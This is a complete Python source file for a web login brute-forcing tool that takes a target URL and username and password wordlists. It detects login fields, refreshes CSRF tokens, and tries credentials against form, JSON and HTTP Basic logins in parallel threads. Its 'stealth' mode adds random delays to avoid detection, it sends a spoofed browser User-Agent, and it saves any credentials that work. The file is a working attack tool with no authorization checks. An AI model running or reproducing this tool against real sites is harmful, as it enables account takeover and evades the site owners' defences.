#!/usr/bin/env python3
"""
Web Login Bruteforcer - Intelligent Authentication Testing
Authored by: Hex

Advanced web application login brute forcing tool with anti-detection features,
session handling, and multiple authentication method support.

Usage:
    python3 web_login_bruteforcer.py --url http://target.com/login --username admin
    python3 web_login_bruteforcer.py --url http://target.com/login --userlist users.txt --wordlist passwords.txt
    python3 web_login_bruteforcer.py --url http://target.com/api/auth --method json --stealth
"""

import argparse
import json
import random
import re
import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebLoginBruteforcer:
    def __init__(self, url, method='form', timeout=10, stealth=False):
        self.url = url
        self.method = method.lower()
        self.timeout = timeout
        self.stealth = stealth
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        self.success_indicators = []
        self.failure_indicators = []
        self.csrf_token = None
        self.form_data = {}
        self.attempts = 0
        self.successes = []
        
    def analyze_login_form(self):
        """Analyze login form to extract parameters and CSRF tokens"""
        print(f"[*] Analyzing login form at {self.url}")
        
        try:
            response = self.session.get(self.url, timeout=self.timeout)
            if response.status_code != 200:
                print(f"[-] Error accessing login page: HTTP {response.status_code}")
                return False
            
            # Extract form fields
            form_patterns = [
                r'<input[^>]*name=["\']([^"\']*user[^"\']*)["\'][^>]*>',
                r'<input[^>]*name=["\']([^"\']*login[^"\']*)["\'][^>]*>',
                r'<input[^>]*name=["\']([^"\']*email[^"\']*)["\'][^>]*>',
                r'<input[^>]*name=["\']([^"\']*pass[^"\']*)["\'][^>]*>',
                r'<input[^>]*name=["\']([^"\']*pwd[^"\']*)["\'][^>]*>'
            ]
            
            for pattern in form_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    if any(keyword in match.lower() for keyword in ['user', 'login', 'email']):
                        self.form_data['username_field'] = match
                    elif any(keyword in match.lower() for keyword in ['pass', 'pwd']):
                        self.form_data['password_field'] = match
            
            # Extract CSRF token
            csrf_patterns = [
                r'<input[^>]*name=["\']([^"\']*token[^"\']*)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>',
                r'<input[^>]*name=["\']([^"\']*csrf[^"\']*)["\'][^>]*value=["\']([^"\']*)["\'][^>]*>',
                r'<meta[^>]*name=["\']([^"\']*token[^"\']*)["\'][^>]*content=["\']([^"\']*)["\'][^>]*>'
            ]
            
            for pattern in csrf_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    self.csrf_token = {'name': matches[0][0], 'value': matches[0][1]}
                    print(f"  [+] CSRF token found: {self.csrf_token['name']}")
                    break
            
            # Detect failure indicators
            common_failure_strings = [
                'invalid', 'incorrect', 'wrong', 'failed', 'error',
                'denied', 'unauthorized', 'forbidden', 'bad'
            ]
            
            self.failure_indicators = common_failure_strings
            
            print(f"  [+] Username field: {self.form_data.get('username_field', 'Not found')}")
            print(f"  [+] Password field: {self.form_data.get('password_field', 'Not found')}")
            
            return True
            
        except Exception as e:
            print(f"[-] Error analyzing login form: {e}")
            return False
    
    def get_csrf_token(self):
        """Refresh CSRF token for each request"""
        if not self.csrf_token:
            return None
            
        try:
            response = self.session.get(self.url, timeout=self.timeout)
            pattern = f'name=["\']({self.csrf_token["name"]})["\'][^>]*value=["\']([^"\']*)["\']'
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                return match.group(2)
        except:
            pass
        
        return self.csrf_token['value']
    
    def attempt_login(self, username, password):
        """Attempt login with given credentials"""
        self.attempts += 1
        
        if self.stealth:
            delay = random.uniform(0.5, 2.0)
            time.sleep(delay)
        
        try:
            if self.method == 'form':
                return self.attempt_form_login(username, password)
            elif self.method == 'json':
                return self.attempt_json_login(username, password)
            elif self.method == 'basic':
                return self.attempt_basic_auth(username, password)
            else:
                print(f"[-] Unsupported authentication method: {self.method}")
                return False, "Unsupported method"
                
        except Exception as e:
            return False, f"Error: {e}"
    
    def attempt_form_login(self, username, password):
        """Attempt form-based login"""
        data = {}
        
        # Use detected form fields or defaults
        username_field = self.form_data.get('username_field', 'username')
        password_field = self.form_data.get('password_field', 'password')
        
        data[username_field] = username
        data[password_field] = password
        
        # Add CSRF token if available
        if self.csrf_token:
            token_value = self.get_csrf_token()
            data[self.csrf_token['name']] = token_value
        
        # Add common form fields
        data.update({
            'submit': 'Login',
            'login': 'Login',
            'signin': 'Sign In'
        })
        
        response = self.session.post(self.url, data=data, timeout=self.timeout, allow_redirects=True)
        
        # Analyze response
        success, message = self.analyze_response(response, username, password)
        
        if success:
            self.successes.append({
                'username': username,
                'password': password,
                'method': 'form',
                'response_code': response.status_code,
                'response_url': response.url
            })
        
        return success, message
    
    def attempt_json_login(self, username, password):
        """Attempt JSON API login"""
        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        }
        
        # Common JSON payload formats
        payloads = [
            {'username': username, 'password': password},
            {'email': username, 'password': password},
            {'login': username, 'password': password},
            {'user': username, 'pass': password},
            {'credentials': {'username': username, 'password': password}}
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    self.url, 
                    json=payload, 
                    headers=headers, 
                    timeout=self.timeout
                )
                
                success, message = self.analyze_response(response, username, password)
                
                if success:
                    self.successes.append({
                        'username': username,
                        'password': password,
                        'method': 'json',
                        'payload': payload,
                        'response_code': response.status_code
                    })
                    return True, message
                elif response.status_code not in [400, 401, 403]:
                    # If we get an unexpected response, it might be working
                    continue
                    
            except Exception as e:
                continue
        
        return False, "JSON login failed"
    
    def attempt_basic_auth(self, username, password):
        """Attempt HTTP Basic Authentication"""
        try:
            response = self.session.get(
                self.url,
                auth=(username, password),
                timeout=self.timeout
            )
            
            success, message = self.analyze_response(response, username, password)
            
            if success:
                self.successes.append({
                    'username': username,
                    'password': password,
                    'method': 'basic',
                    'response_code': response.status_code
                })
            
            return success, message
            
        except Exception as e:
            return False, f"Basic auth error: {e}"
    
    def analyze_response(self, response, username, password):
        """Analyze response to determine login success/failure"""
        
        # Check status codes
        if response.status_code == 200:
            # Success indicators in response
            success_patterns = [
                'dashboard', 'welcome', 'logout', 'profile', 'admin',
                'success', 'authenticated', 'logged in'
            ]
            
            for pattern in success_patterns:
                if pattern in response.text.lower():
                    return True, f"Success indicator found: {pattern}"
        
        elif response.status_code in [302, 301]:
            # Redirect might indicate success
            location = response.headers.get('Location', '')
            if any(keyword in location.lower() for keyword in ['dashboard', 'admin', 'home', 'profile']):
                return True, f"Successful redirect to: {location}"
        
        elif response.status_code == 401:
            return False, "Unauthorized"
        elif response.status_code == 403:
            return False, "Forbidden"
        
        # Check for failure indicators
        for indicator in self.failure_indicators:
            if indicator in response.text.lower():
                return False, f"Failure indicator: {indicator}"
        
        # Check response length (different length might indicate success)
        if hasattr(self, 'baseline_length'):
            length_diff = abs(len(response.text) - self.baseline_length)
            if length_diff > 100:  # Significant difference
                return True, f"Response length changed significantly: {len(response.text)} vs {self.baseline_length}"
        else:
            self.baseline_length = len(response.text)
        
        return False, f"Login failed (HTTP {response.status_code})"
    
    def load_wordlist(self, filename):
        """Load wordlist from file"""
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Error loading wordlist {filename}: {e}")
            return []
    
    def brute_force_single_user(self, username, password_list):
        """Brute force passwords for a single username"""
        print(f"[*] Testing {len(password_list)} passwords for user: {username}")
        
        for i, password in enumerate(password_list, 1):
            if i % 100 == 0:
                print(f"  [*] Progress: {i}/{len(password_list)} passwords tested")
            
            success, message = self.attempt_login(username, password)
            
            if success:
                print(f"  [+] SUCCESS: {username}:{password}")
                return True
            else:
                if self.stealth and i % 10 == 0:
                    time.sleep(random.uniform(1, 3))
        
        print(f"  [-] No valid password found for {username}")
        return False
    
    def brute_force_user_list(self, username_list, password_list, max_workers=5):
        """Brute force with multiple usernames and passwords"""
        print(f"[*] Testing {len(username_list)} usernames with {len(password_list)} passwords")
        
        if self.stealth:
            max_workers = min(max_workers, 2)  # Reduce threads in stealth mode
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            
            for username in username_list:
                for password in password_list:
                    future = executor.submit(self.attempt_login, username, password)
                    futures.append((future, username, password))
            
            for future, username, password in futures:
                try:
                    success, message = future.result(timeout=30)
                    if success:
                        print(f"[+] SUCCESS: {username}:{password}")
                except Exception as e:
                    print(f"[-] Error testing {username}:{password} - {e}")
    
    def generate_report(self, output_file=None):
        """Generate report of successful logins"""
        report = {
            'target_url': self.url,
            'method': self.method,
            'total_attempts': self.attempts,
            'successful_logins': self.successes,
            'success_count': len(self.successes),
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"[+] Report saved to {output_file}")
        
        return report
    
    def print_summary(self):
        """Print summary of brute force results"""
        print("\n" + "="*60)
        print("WEB LOGIN BRUTEFORCER - RESULTS SUMMARY")
        print("="*60)
        print(f"Target URL: {self.url}")
        print(f"Method: {self.method}")
        print(f"Total Attempts: {self.attempts}")
        print(f"Successful Logins: {len(self.successes)}")
        
        if self.successes:
            print("\n[+] SUCCESSFUL CREDENTIALS:")
            for i, cred in enumerate(self.successes, 1):
                print(f"  {i}. {cred['username']}:{cred['password']} (Method: {cred['method']})")
        
        print("="*60)

def main():
    parser = argparse.ArgumentParser(description='Web Login Bruteforcer - Intelligent authentication testing')
    parser.add_argument('--url', '-u', required=True, help='Target login URL')
    parser.add_argument('--username', help='Single username to test')
    parser.add_argument('--password', help='Single password to test')
    parser.add_argument('--userlist', help='File containing usernames')
    parser.add_argument('--wordlist', '-w', help='File containing passwords')
    parser.add_argument('--method', choices=['form', 'json', 'basic'], default='form', help='Authentication method')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--threads', '-t', type=int, default=5, help='Number of threads')
    parser.add_argument('--stealth', action='store_true', help='Enable stealth mode with delays')
    parser.add_argument('--output', '-o', help='Output file for results')
    parser.add_argument('--analyze-only', action='store_true', help='Only analyze login form')
    
    args = parser.parse_args()
    
    # Create bruteforcer instance
    bruteforcer = WebLoginBruteforcer(args.url, args.method, args.timeout, args.stealth)
    
    # Analyze login form
    if args.method == 'form':
        if not bruteforcer.analyze_login_form():
            print("[-] Failed to analyze login form")
            sys.exit(1)
    
    if args.analyze_only:
        sys.exit(0)
    
    # Prepare credentials
    if args.username and args.password:
        # Single credential test
        success, message = bruteforcer.attempt_login(args.username, args.password)
        if success:
            print(f"[+] SUCCESS: {args.username}:{args.password}")
        else:
            print(f"[-] FAILED: {args.username}:{args.password} - {message}")
    
    elif args.username and args.wordlist:
        # Single user, multiple passwords
        password_list = bruteforcer.load_wordlist(args.wordlist)
        if not password_list:
            print("[-] No passwords loaded")
            sys.exit(1)
        bruteforcer.brute_force_single_user(args.username, password_list)
    
    elif args.userlist and args.wordlist:
        # Multiple users and passwords
        username_list = bruteforcer.load_wordlist(args.userlist)
        password_list = bruteforcer.load_wordlist(args.wordlist)
        
        if not username_list or not password_list:
            print("[-] Failed to load username or password list")
            sys.exit(1)
        
        bruteforcer.brute_force_user_list(username_list, password_list, args.threads)
    
    else:
        print("[-] Must specify credentials: --username/--password or --username/--wordlist or --userlist/--wordlist")
        sys.exit(1)
    
    # Generate results
    bruteforcer.print_summary()
    
    if args.output:
        bruteforcer.generate_report(args.output)

if __name__ == "__main__":
    main()